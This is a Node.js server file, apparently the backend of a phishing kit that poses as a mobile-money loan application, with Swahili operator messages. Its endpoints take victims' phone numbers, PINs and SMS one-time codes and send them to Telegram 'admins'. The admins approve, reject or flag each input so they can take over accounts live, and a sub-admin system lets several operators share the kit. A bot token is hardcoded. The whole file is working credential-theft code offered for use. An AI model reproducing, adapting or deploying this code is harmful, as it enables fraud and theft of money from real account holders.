const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Main System Bot Token and Main Admin ID
const MAIN_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
const PORT = process.env.PORT || 10000;

if (!MAIN_BOT_TOKEN) {
    console.error("❌ ERROR: Main Telegram Bot Token is missing!");
} else {
    console.log("🤖 Initializing Main Telegram Bot...");
}

const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });

mainBot.on('polling_error', (error) => {
    console.error('⚠ Main Bot Polling Error:', error.code, error.message);
});

let activeSessions = {};
let authorizedAdmins = new Set(MAIN_ADMIN_ID ? [MAIN_ADMIN_ID] : []);
let pendingAdmins = {};

function escapeMarkdown(text) {
    if (!text) return '';
    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

mainBot.on('message', (msg) => {
    if (!msg.text) return;
    const chatId = msg.chat.id;
    const userIdStr = chatId.toString().trim();
    const firstName = msg.from.first_name || 'Admin';
    const username = msg.from.username ? `@${msg.from.username}` : 'No username set';

    // STRICT ISOLATION: If a regular sub-admin tries to type random text (not a command), ignore or block it completely 
    // so they cannot leak messages or trigger cross-traffic to the main admin or others.
    if (userIdStr !== MAIN_ADMIN_ID && authorizedAdmins.has(userIdStr)) {
        if (!msg.text.startsWith('/start')) {
            // Silently ignore or drop non-command text from sub-admins to prevent unintended message passing
            return;
        }
    }

    if (msg.text.startsWith('/broadcast')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
            return;
        }

        const broadcastMessage = msg.text.replace('/broadcast', '').trim();
        if (!broadcastMessage) {
            mainBot.sendMessage(chatId, "⚠️ Tafadhali andika ujumbe unaotaka kutuma baada ya amri.\n\nMfano:\n`/broadcast Habari wadau, mfumo uko tayari!`", { parse_mode: "Markdown" });
            return;
        }

        let successCount = 0;
        let failCount = 0;

        const broadcastPromises = Array.from(authorizedAdmins).map(async (adminId) => {
            // Do not broadcast back to main admin if desired, or keep for tracking
            if (adminId === MAIN_ADMIN_ID) return;
            try {
                await mainBot.sendMessage(adminId, `📢 **UJUMBE KUTOKA KWA SYSTEM:**\n\n${broadcastMessage}`, { parse_mode: "Markdown" });
                successCount++;
            } catch (err) {
                console.error(`Failed to broadcast to ${adminId}:`, err.message);
                failCount++;
            }
        });

        Promise.all(broadcastPromises).then(() => {
            mainBot.sendMessage(chatId, `✅ Ujumbe umerushwa kwa sub-admins!\n\n- Waliofanikiwa: ${successCount}\n- Walioshindwa: ${failCount}`);
        });
        return;
    }

    if (msg.text.startsWith('/start')) {
        if (userIdStr === MAIN_ADMIN_ID || authorizedAdmins.has(userIdStr)) {
            authorizedAdmins.add(userIdStr);
            sendAdminLink(chatId, userIdStr, firstName, username);
            return;
        }

        pendingAdmins[userIdStr] = { chatId, firstName, username };
        
        const requestText = `🚨 *Maombi Mapya ya Sub-Admin!*\n\n` +
            `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
            `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
            `🏷 *Username:* ${escapeMarkdown(username)}`;

        if (MAIN_ADMIN_ID) {
            mainBot.sendMessage(MAIN_ADMIN_ID, requestText, {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "RUHUSU (APPROVE)", callback_data: `approveadmin_${userIdStr}` },
                            { text: "KATAA (DENY)", callback_data: `denyadmin_${userIdStr}` }
                        ]
                    ]
                }
            }).catch(err => console.error("Error sending auth request to main admin:", err));
        }

        mainBot.sendMessage(chatId, "⏳ Ombi lako limeshatumwa kwa Msimamizi Mkuu. Subiri uidhinishwe.");
    }
});

function sendAdminLink(chatId, userIdStr, firstName, username) {
    const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    const isolatedLink = `${host}/?admin=${userIdStr}`;
    const welcomeText = `🚨 *Kiungo Chako cha Admin Kimesajiliwa!*\n\n` +
        `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
        `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
        `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
        `🔗 *Kiungo Chako Maalum:*\n${isolatedLink}`;

    mainBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
        .catch(err => console.error("Error sending start message:", err));
}

function setupCallbackHandler(botInstance, isMain = false) {
    botInstance.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const data = query.data;
        const userIdStr = chatId.toString().trim();

        if (isMain && (data.startsWith('approveadmin_') || data.startsWith('denyadmin_'))) {
            if (userIdStr !== MAIN_ADMIN_ID) {
                botInstance.answerCallbackQuery(query.id, { text: "⚠ Wewe si Main Admin!", show_alert: true });
                return;
            }
            const targetSubId = data.split('_')[1];
            const subAdminInfo = pendingAdmins[targetSubId];

            if (data.startsWith('approveadmin_')) {
                authorizedAdmins.add(targetSubId);
                if (subAdminInfo) {
                    mainBot.sendMessage(subAdminInfo.chatId, `✅ Ombi lako la kuwa Sub-Admin limekubaliwa! Hapa kuna kiungo chako maalum:`);
                    sendAdminLink(subAdminInfo.chatId, targetSubId, subAdminInfo.firstName, subAdminInfo.username);
                    mainBot.sendMessage(MAIN_ADMIN_ID, `✅ Umemruhusu Sub-Admin ${targetSubId} kikamilifu.`);
                }
            } else {
                if (subAdminInfo) {
                    mainBot.sendMessage(subAdminInfo.chatId, "❌ Ombi lako la kuwa Sub-Admin limekataliwa.");
                    mainBot.sendMessage(MAIN_ADMIN_ID, `❌ Umekataa ombi la Sub-Admin ${targetSubId}.`);
                }
            }
            delete pendingAdmins[targetSubId];
            botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: query.message.message_id }).catch(() => {});
            botInstance.answerCallbackQuery(query.id);
            return;
        }

        const parts = data.split('_');
        const action = parts[0]; 
        const sessionId = parts.slice(1).join('_');

        const session = activeSessions[sessionId];
        if (!session) {
            botInstance.answerCallbackQuery(query.id, { text: "Kipindi kimeisha au hakionekani.", show_alert: true });
            return;
        }

        // STRICT CHECK: Ensure only the specific assigned targetAdmin for this session can click action buttons
        if (session.targetAdmin !== userIdStr) {
            botInstance.answerCallbackQuery(query.id, { text: "⚠ Ruhusa imekataliwa: Hii si ya kwako.", show_alert: true });
            return;
        }

        if (action === 'allow') session.status = 'approved_pin';
        else if (action === 'deny') session.status = 'denied';
        else if (action === 'wrongpin') session.status = 'wrong_pin';
        else if (action === 'wrongsms') session.status = 'wrong_sms';
        else if (action === 'approved') session.status = 'success';

        botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, {
            chat_id: chatId,
            message_id: query.message.message_id
        }).catch(err => console.error("Error clearing markup:", err));

        botInstance.answerCallbackQuery(query.id).catch(err => console.error("Error answering callback query:", err));
    });
}

setupCallbackHandler(mainBot, true);

app.post('/api/submit-credentials', (req, res) => {
    const { sessionId, sliderData, loanData, phone, pin, adminId } = req.body;
    
    let targetAdmin = MAIN_ADMIN_ID;

    if (adminId && authorizedAdmins.has(adminId)) {
        targetAdmin = adminId;
    } else {
        return res.json({ success: false, message: 'Unauthorized link.' });
    }

    activeSessions[sessionId] = {
        sliderData, loanData, phone, pin,
        targetAdmin,
        status: 'pending_pin_approval'
    };

    const message = `NEW MIXX APPLICANT\n\n` +
        `PHONE NO: ${phone}\n` +
        `PIN: ${pin}`;

    mainBot.sendMessage(targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "RUHUSU (ALLOW)", callback_data: `allow_${sessionId}` },
                    { text: "KATAA (DENY)", callback_data: `deny_${sessionId}` }
                ]
            ]
        }
    }).then(() => {
        console.log(`✅ Credentials successfully sent to designated admin chat ID: ${targetAdmin}`);
    }).catch(err => {
        console.error(`❌ Telegram Send Error:`, err.response ? err.response.body : err.message);
    });

    res.json({ success: true, sessionId });
});

app.post('/api/submit-otp', (req, res) => {
    const { sessionId, otpText } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ status: 'not_found', message: 'Session not found' });
    }

    session.otpText = otpText;
    session.status = 'pending_final_approval';

    const message = `UTHIBITISHO WA SMS OTP\n\n` +
        `NAMBARI YA SIMU: ${session.phone}\n\n` +
        `OTP:\n${otpText}`;

    mainBot.sendMessage(session.targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📋 Nakili Ujumbe", copy_text: { text: otpText } }
                ],
                [
                    { text: "PIN MBAYA ❌", callback_data: `wrongpin_${sessionId}` },
                    { text: "SMS MBAYA", callback_data: `wrongsms_${sessionId}` }
                ],
                [
                    { text: "IMETHIBITISHWA", callback_data: `approved_${sessionId}` }
                ]
            ]
        }
    }).then(() => {
        console.log(`✅ OTP successfully sent to admin ${session.targetAdmin}`);
    }).catch(err => console.error(`❌ Failed to send OTP alert to admin:`, err));

    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const session = activeSessions[req.params.sessionId];
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    res.json({ status: session.status });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
        
